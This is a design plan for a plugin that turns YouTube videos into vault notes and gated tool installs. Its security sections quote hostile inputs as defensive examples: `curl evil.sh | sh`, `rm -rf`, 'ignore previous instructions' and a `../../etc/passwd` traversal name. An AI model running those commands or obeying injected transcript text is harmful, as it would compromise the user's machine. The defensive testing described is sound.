# Self-Learning Agent — Plan

**Status:** design, pre-implementation
**Last updated:** 2026-09-06
**Owner:** @sohamchoulwar

---

## 1. Problem

Creators like [Greg Isenberg](http://youtube.com/@GregIsenberg) publish a high volume of
videos about building with AI agents — which tools to use, which MCP servers, which
prompting patterns. The information is genuinely useful but arrives faster than a
human can absorb, remember, and *set up*. By the time you need a technique, you've
forgotten which video it was in and how to configure it.

## 2. Goal

A pipeline where the coding agent watches a source (a video, a channel, later any
document), writes a durable note into an Obsidian vault explaining what it teaches
and what to use, and then — behind an explicit human gate — installs and configures
the things worth having.

Open source, MIT, installable by anyone as a Claude Code plugin.

## 3. Non-goals (v1)

- Not a general video summarizer. The output is *actionable setup*, not a recap.
- Not a replacement for watching videos you enjoy watching.
- No vision-on-frames (see Known Limitations).
- No hosted service, no multi-user, no auth.

---

## 4. Locked decisions

| # | Decision | Choice | Why |
|---|---|---|---|
| D1 | What the pipeline *does* after the doc | **Generates skills AND installs real tools** | Full automation is the point; guarded by the gate in §8 |
| D2 | Trigger model | **Manual `/learn` first, cron later** | Prove the pipeline end-to-end where you can watch it work |
| D3 | Project shape | **Python core + Claude Code plugin** | Deterministic work is tested Python; synthesis is the agent. Frontend later calls the Python layer |
| D4 | Note destination | **New dedicated vault** (`/mnt/d/LearningVault`) | Keeps machine-generated notes out of human notes; clean OSS default; safe to wipe while tuning |
| D5 | Transcript source | **`yt-dlp`, anonymous** | Channel listings *and* captions with no API key. YouTube Data API stays optional |
| D6 | Output shape | **Classified: tooling vs. conceptual** | A setup video and an ideas video deserve different notes. See §7.1 |
| D7 | How generated skills reach Claude Code | **Copy on apply** (symlink opt-in) | Works identically on every OS; symlinks across WSL/Windows/macOS need per-platform setup. See §8 Rule 6 |

### Accepted improvements (agreed 2026-09-06)

| # | Improvement | Rationale |
|---|---|---|
| I1 | Feed **description + chapters + pinned comment**, not just the transcript | Auto-captions mangle exactly the words that matter (`MCP`→`mcp`, `n8n`→`an eight n`, `Claude Code`→`cloud code`). Descriptions are human-typed and hold the real links. Biggest accuracy win per unit of effort |
| I2 | **Cache raw fetches on disk**, keyed by video ID | Synthesis will be re-run many times while tuning prompts. Also makes tests run offline against fixtures |
| I3 | **`proposals: []` is a valid, expected output** | Most videos teach nothing installable. If the pipeline is *expected* to emit proposals it will manufacture them. This is the failure mode that makes such tools untrustworthy |
| I4 | Input is a **`Source` interface** from day one | `YouTubeSource` ships v1; `ArticleSource` / `PDFSource` become ~30-line adapters. Designing the seam now is free; retrofitting is a rewrite |

---

## 5. Architecture

Two phases separated by a human gate. Nothing outside the vault is touched before
the gate.

```
PLAN phase — no side effects outside the vault
┌───────────────────────────────────────────────────┐
│ 1. resolve     url / @handle  → video IDs          │  python
│ 2. dedupe      drop already-processed IDs          │  python (ledger)
│ 3. fetch       transcript + description + chapters │  python (yt-dlp, cached)
│ 4. inventory   installed skills / MCPs / CLIs      │  python
│ 5. synthesize  note.md + proposals.json            │  ← AGENT
│ 6. write       note into vault                     │  python
└───────────────────────────────────────────────────┘
                        ↓
              ██ HUMAN REVIEWS THE NOTE ██
                        ↓
APPLY phase — touches the machine
┌───────────────────────────────────────────────────┐
│ 7. gate        per-proposal confirm + allowlist    │  python
│ 8. apply       write skills / install / configure  │  python
│ 9. record      ledger + "Applied" note section     │  python
└───────────────────────────────────────────────────┘
```

### Why step 4 exists

Before synthesis, the pipeline hands the agent an inventory of already-installed
skills, MCP servers, and CLIs. The note therefore reads:

> *"Video recommends Playwright MCP — **you already have it**. The new part is his
> selector-retry pattern, which is worth adding as a skill."*

instead of proposing 224 things you already own. The tool gets **sharper** the more
you already have, rather than noisier.

---

## 6. The `Source` interface (I4)

```python
@dataclass(frozen=True)
class SourceDocument:
    source_type: str          # "youtube" | "article" | "pdf"
    source_id: str            # stable dedupe key (video ID, URL hash)
    url: str | None
    title: str
    author: str | None
    published_at: datetime | None
    text: str                 # transcript or body
    text_quality: str         # "manual_captions" | "auto_captions" | "native"
    description: str | None   # human-typed; high trust (I1)
    chapters: list[Chapter]   # free structure (I1)
    links: list[Link]         # extracted from description; high trust (I1)
    raw: dict                 # provider payload, for debugging

class Source(Protocol):
    def resolve(self, ref: str) -> list[str]: ...      # ref → source_ids
    def fetch(self, source_id: str) -> SourceDocument: ...
```

v1 ships `YouTubeSource` only.

---

## 7. Output: the vault note

One note per source, Obsidian-flavored markdown with YAML frontmatter.

```markdown
---
source: youtube
source_id: <video_id>
url: <url>
channel: Greg Isenberg
title: "..."
published: 2026-09-01
processed: 2026-09-06T20:14:00Z
pipeline_version: 0.1.0
text_quality: auto_captions
class: tooling            # tooling | conceptual | mixed
class_confidence: high
status: pending-review        # → applied | dismissed | partial
tags: [youtube, greg-isenberg, claude-code, mcp]
---

# <Title>

> Thesis of the video in one paragraph — the actual argument, not the intro.

## TL;DR
3–6 bullets, each an actionable claim.

## Tools & resources mentioned
| Tool | What it's for | Already installed? | Link |
|---|---|---|---|

## Techniques & patterns
### <Pattern name>
What it is, when to use it, why it works. Verbatim quote where wording matters.

## Proposed actions
Human-readable render of proposals.json.

## Gaps & uncertainty
- Things demoed on screen that the transcript lost
- Names the ASR likely mangled, with best guess and confidence

## Project ideas
Weighted by class (§7.1). Each idea meets the bar in §7.2:
what it is / why it is interesting / stack / first step / size.

## Links from description

## Applied
Appended by the APPLY phase: what ran, when, result, how to undo.
```

`## Gaps & uncertainty` is mandatory. Making the pipeline state what it *couldn't*
see is what keeps it honest.

### 7.1 Source classification (D6)

Before synthesis, the source is classified. The classification decides **which half of
the note carries the weight** — the same pipeline, two payoffs.

| Class | What it looks like | Note emphasis |
|---|---|---|
| `tooling` | Demos a GitHub repo, an MCP server, a CLI, a Claude skill, a setup workflow | **Proposed actions** is the payload. 1–2 project ideas, brief |
| `conceptual` | Business ideas, market teardowns, interviews, trends, strategy | Proposals are usually empty — and that is correct (I3). **Project ideas** is the payload: 3–5, developed |
| `mixed` | Teaches a tool *and* argues an idea | Both sections carry weight |

The classifier is the agent, not a keyword matcher, and it records its reasoning in
frontmatter (`class:` + `class_confidence:`) so a wrong call is visible and fixable.

**Flow consequence:** the approval gate only runs when proposals exist. A `conceptual`
video ends at "here is your note" — there is nothing to install, and the pipeline says
so plainly instead of inventing work.

### 7.2 Project idea quality bar

A project idea is not "build an app with n8n." Each one must carry:

- **What it is** — one sentence a person could repeat back
- **Why it is interesting** — the non-obvious part, or the thing it proves
- **Stack** — concrete, and preferring things already installed (§6 inventory)
- **First step** — the literal first command or file, so it is startable tonight
- **Size** — weekend / week / month, honestly estimated

Ideas that fail the bar are dropped rather than padded. Three real ideas beat eight
generic ones.

---

## 8. Security model — the gate

**Threat:** a transcript, description, or comment is untrusted input written by a
third party. Under D1 that input can influence commands that run on the machine.
A video description saying `curl evil.sh | sh` must never become an executed command.

### Rule 1 — the agent never emits a shell string

Proposals name a **package on a known registry**, never a command. The Python layer
builds the command from a template. There is no path from transcript text to `bash`.

```json
{ "kind": "package", "manager": "npm", "name": "@playwright/mcp", "version": "latest" }
```
→ python renders → `npm install -g @playwright/mcp@latest`

### Rule 2 — risk tiers

| Tier | Examples | Policy |
|---|---|---|
| `none` | Write a skill `.md` inside the project repo | Auto-apply if opted in |
| `low` | Write into `~/.claude/skills/`, add an MCP entry | Confirm, batched |
| `medium` | Install from npm / PyPI **on the allowlist** | Confirm individually, exact command shown |
| `high` | Anything off-allowlist, anything needing a secret, any `git clone`+run, any URL-sourced script | **Never automated.** Printed as manual instructions only |

### Rule 3 — allowlist

Package managers: `npm`, `npx`, `pip`, `uv`, `pipx`.
Registries: npmjs.com, PyPI. Git: `github.com` clones only, never executed after clone.
Everything else is `high` by definition.

### Rule 4 — secrets are never handled

If a proposal needs an API key, the pipeline writes the `.env` *key name* and stops.
It never reads, writes, echoes, or transmits a value.

### Rule 5 — every apply is reversible

Each proposal carries an `undo` field. The `Applied` note section records it.

### Rule 6 — generated skills are reviewable before they are live (D7)

Generated skills are written to `generated-skills/<name>/SKILL.md` **inside this repo**,
where they are ordinary tracked files. `git diff` shows exactly what the agent authored
before any of it takes effect, and `git revert` rolls back a skill built on bad advice.

Activation is a separate, explicit step:

```
generated-skills/<name>/     ──[ sla apply ]──►   ~/.claude/skills/<name>/
   (git: reviewable)              copy               (live)
```

**Default is copy, not symlink.** Symlinks across WSL / Windows / macOS need
per-platform setup and dangle when the repo moves — unacceptable for a tool other
people install. `install_mode = "symlink"` is available in config for a faster local
loop, and is documented as the advanced option.

Cost of copying: two files can drift if the live copy is hand-edited. `sla status`
diffs repo against live and reports drift, so it is visible rather than silent.

*Reviewability is a security control, not a convenience.* Under D1 the agent authors
instructions that later steer an agent with shell access. A human-readable diff before
activation is the last checkpoint on that path.

---

## 9. `proposals.json` contract

```json
{
  "schema_version": 1,
  "source_id": "<video_id>",
  "generated_at": "2026-09-06T20:14:00Z",
  "proposals": [
    {
      "id": "p1",
      "kind": "skill|mcp_server|package|repo_clone|config_edit|manual",
      "title": "Add selector-retry pattern as a skill",
      "rationale": "Why this is worth having, given what is already installed",
      "evidence": { "quote": "...", "timestamp": "12:43" },
      "risk": "none|low|medium|high",
      "already_have": false,
      "action": { "type": "write_file", "path": "...", "content_ref": "artifacts/p1-SKILL.md" },
      "requires_secret": [],
      "reversible": true,
      "undo": "rm -rf ~/.claude/skills/selector-retry"
    }
  ]
}
```

Validated with a JSON Schema / pydantic model before the gate ever sees it.
Invalid proposal → dropped, logged, surfaced in the note. **Never** silently applied.

---

## 10. Repo layout

```
self-learning-agent/
├── README.md  PLAN.md  LICENSE (MIT)  pyproject.toml
├── .claude-plugin/plugin.json        # installable as a Claude Code plugin
├── commands/learn.md                 # /learn <url|@handle|path>
├── skills/learn-from-source/SKILL.md # synthesis instructions for the agent
├── generated-skills/                 # agent-authored skills, in git, pre-activation (D7)
├── src/self_learning_agent/
│   ├── sources/{base,youtube}.py
│   ├── cache.py       # I2 — raw fetch cache
│   ├── ledger.py      # processed source_ids (sqlite)
│   ├── inventory.py   # installed skills / MCPs / CLIs
│   ├── vault.py       # note render + write
│   ├── proposals.py   # schema + validation
│   ├── gate.py        # risk policy + allowlist
│   ├── apply.py       # executes approved proposals; copies skills live (D7)
│   ├── config.py      # ~/.self-learning-agent/config.toml
│   └── cli.py         # sla fetch | inventory | apply | status (incl. drift check)
└── tests/  (+ fixtures/ for offline transcript tests)
```

---

## 11. Milestones

| M | Deliverable | Done when |
|---|---|---|
| M0 | ✅ Repo skeleton, config, CI, MIT license | `pytest` runs green on an empty suite |
| M1 | ✅ `sla fetch <url>` → cached `SourceDocument` JSON | Works offline on 2nd run; ledger dedupes |
| M2 | ✅ `sla inventory` → installed skills/MCPs/CLIs | Correctly lists the 224 local skills |
| M3 | ✅ `/learn <url>` → note in vault + `proposals.json` | A `tooling` video yields proposals worth approving **and** a `conceptual` video yields ideas worth building |
| M4 | Gate + `sla apply` | A `medium` proposal installs; a `high` one refuses and prints instructions; a generated skill goes repo → live via copy |
| M5 | Channel batch: `/learn @GregIsenberg --last 5` | Dedupes against ledger, caps per-run cost |
| M6 | Scheduled polling | Cron/daemon, digest note per run |
| M7 | Frontend | Paste a link → same Python entrypoint |

v1 = **M0–M4.**

---

## 12. Testing

Per repo standards (80% minimum, TDD):

- **Unit:** proposal validation, risk classification, allowlist, note rendering, ledger dedupe, chapter parsing.
- **Classification:** fixture set of known `tooling` / `conceptual` videos; a misclassification is a real bug, not a style issue.
- **Security (highest value):** adversarial fixture transcripts containing injection attempts (`curl | sh`, `rm -rf`, "ignore previous instructions") must classify `high` and never execute. This suite is the one that must never go red.
- **Integration:** fixture video → full PLAN phase → assert note structure.
- **Install mode:** copy activates correctly; drift between repo and live copy is detected and reported, never silently overwritten.
- **E2E:** one live network test, marked, off by default in CI.

---

## 13. Known limitations (document in README)

1. **Screen content is lost.** Videos demo things visually while the audio says
   "paste this in here." Description links mitigate; frame sampling + vision is
   deferred as too expensive for v1.
2. **ASR mangles product names.** Mitigated by I1, not solved. The note flags
   low-confidence names rather than hiding the problem.
3. **No paywalled/members-only content.**
4. **Recommendation quality is bounded by the creator.** The pipeline faithfully
   relays what a video says; it does not independently verify that the advice is good.

---

## 14. Open questions

- [ ] Exact vault path and folder structure inside `/mnt/d/LearningVault`
- [x] ~~Do generated skills go to `~/.claude/skills/` or a repo folder that is symlinked?~~ → **D7: copy on apply**, symlink opt-in
- [x] ~~Verify Claude Code skill discovery follows symlinks~~ → **yes**, proven in M2 (§16)
- [ ] Per-run token/cost cap for batch mode (M5)
- [ ] Whether `none`-risk auto-apply is opt-in or always-confirm

---

## 15. Field notes from M1 (2026-09-06)

First real fetch: `9_SZFIW7tus` — *"5 GitHub Repos: Kill AI Slop, Go Viral, Make Money"*,
Greg Isenberg, 24.7 min. Kept as the primary test fixture.

### What the data actually looks like

| Signal | Result |
|---|---|
| Manual captions | none |
| Auto captions | present, **4,150 words of clean punctuated prose** |
| Chapters | 7, each naming a repo |
| Description | 4,761 chars — all 5 repo URLs, timestamps, *and* the creator's own prose summaries |

### The I1 hypothesis was right, for a sharper reason than stated

The original worry was that auto-captions would be broadly unusable. They are not —
the prose is good. **Proper nouns are what break:**

| Captioned as | Actually is |
|---|---|
| "Skill Specter" | `NVIDIA/SkillSpector` |
| "Cloud Code" | Claude Code |

Both are exactly the tokens needed to find a repo. Searching GitHub for
"Skill Specter" returns nothing. The description holds
`https://github.com/NVIDIA/SkillSpector` verbatim.

**Revised rule, now load-bearing:**

> The **description is authoritative for entity names.**
> The **transcript is authoritative for reasoning about them** — why a repo matters,
> when to use it, what the caveat is. Neither substitutes for the other.

### Consequence for M3 (synthesis)

Synthesis must perform **entity reconciliation**, not naive extraction: take candidate
names from the description's links, then match transcript discussion to them by
position (chapters give the alignment) rather than by string match. A tool named only
in speech and never linked is **low confidence by construction** and belongs under
`## Gaps & uncertainty`, never in a proposal.

`Link.repo_slug` preserves original URL casing for this reason, and it is regression-tested.

### Environment notes

- `yt-dlp` warns that **Python 3.10 support is deprecated**. Dev machine is 3.10.12;
  CI covers 3.10–3.12. Worth moving to 3.11+ before it becomes forced.
- Raw metadata is ~660KB, almost all format listings. `_fetch_metadata` keeps ~15
  fields, which is what makes fixtures small enough to commit (6KB).

---

## 16. Field notes from M2 (2026-09-07)

Inventory run against the real machine: **223 user skills, 33 plugin skills, 28 MCP
servers.** Two bugs surfaced only because it was pointed at a real setup rather than
a fixture.

### `Path.rglob` silently hides symlinked skills

32 of 224 skill directories are symlinks (`brainstorming -> ../../.agents/skills/brainstorming`).
`Path.rglob` does not descend into symlinked directories, so the first implementation
found **191 of 223** and reported no error — the worst kind of bug, since a skill you
own but that inventory cannot see becomes a redundant proposal.

Fixed with `os.walk(followlinks=True)` plus a realpath-visited set, because following
links makes cycles possible. Both paths are regression-tested.

**This resolves an open question from §14:** Claude Code evidently *does* follow
symlinks for skill discovery, since those 32 skills load correctly. `install_mode =
"symlink"` (D7) is therefore viable. Copy remains the default for cross-platform
portability, not because symlinks are unproven.

### Jaccard was the wrong similarity metric

`similar_skills` initially scored `|A∩B| / |A∪B|`, which punishes a skill for having a
longer description than the query. Nothing ever crossed the threshold. Changed to
containment (`|A∩B| / |A|`) with IDF weighting, so rare words carry the signal and
generic vocabulary does not float unrelated skills up.

**Honest limit:** even weighted, keyword overlap over one-line descriptions is weak. It
puts `security-scan` at the top for a SkillSpector-style pitch, but also surfaces noise.
Real semantic matching needs embeddings — a dependency and a model call.

So the contract is deliberate:

| Check | Reliability | Use |
|---|---|---|
| `has_skill` / `has_mcp` / `has_cli` | exact | authoritative "you already have this" |
| `similar_skills` | weak | **shortlist only** — narrows 256 to ~3 for the agent to judge |

Tuning the fuzzy matcher further is polishing the wrong layer; judgment belongs to
synthesis, which reads the shortlisted descriptions.

---

## 17. Field notes from M3 (2026-09-07)

Synthesis shipped and run end to end on the fixture video. The note it produced is
one worth keeping, which was M3's stated done-condition.

### The seam that makes Rule 1 structural

`sla brief` emits data; the agent returns JSON; `sla note` validates and renders.
The agent has no file-writing and no command-producing capability in this path at
all — so §8 Rule 1 is enforced by the shape of the interface rather than by the
agent's good behaviour.

Two properties fell out of that:

- **Claimed risk is discarded.** `derive_risk()` recomputes the tier from the kind
  and action. A proposal asserting `"risk": "none"` on an npm install still comes
  out `medium`. Regression-tested.
- **Invalid proposals are dropped and surfaced**, never repaired. Silently fixing a
  malformed proposal would mean guessing at intent on untrusted input.

### A real vulnerability the adversarial suite caught

`../../etc/passwd` passed package-name validation. Every character in it is legal in
a genuine package name (`lodash.merge`, `@scope/name`), so the charset regex accepted
it — and `npm install -g ../../etc/passwd` installs from a local path.

Fixed with a **shape** check rather than a charset one: reject `..`, reject leading
`/ . ~`, and allow at most one `/` and only for an `@scope`. Both the attacks and the
legitimate names are regression-tested.

This is the argument for §12's adversarial suite in miniature: the bug was invisible
to inspection and obvious to a test.

### Restrictive by design, and it shows

Real-world install instructions frequently fall outside the allowlist. In the fixture
video, two of five repos did:

| Repo | Documented install | Tier |
|---|---|---|
| NVIDIA/SkillSpector | `uv tool install git+https://...` | `high` — a git URL is clone-and-execute, not a registry install |
| petergyang/no-ai-slop | `npx skills add <github url>` | `high` — `npx` is not an allowlisted manager |

Both render as manual instructions with the exact command printed. That is the
intended behaviour, not a gap: automating a git-URL install would defeat the
allowlist. Worth revisiting only with evidence that manual-tier proposals are being
ignored in practice.

### Inventory earned its place immediately

Synthesis dropped the No AI Slop proposal outright: `brand-voice` is already
installed and covers the same ground. That is one of five recommendations removed by
M2 on the very first real run.
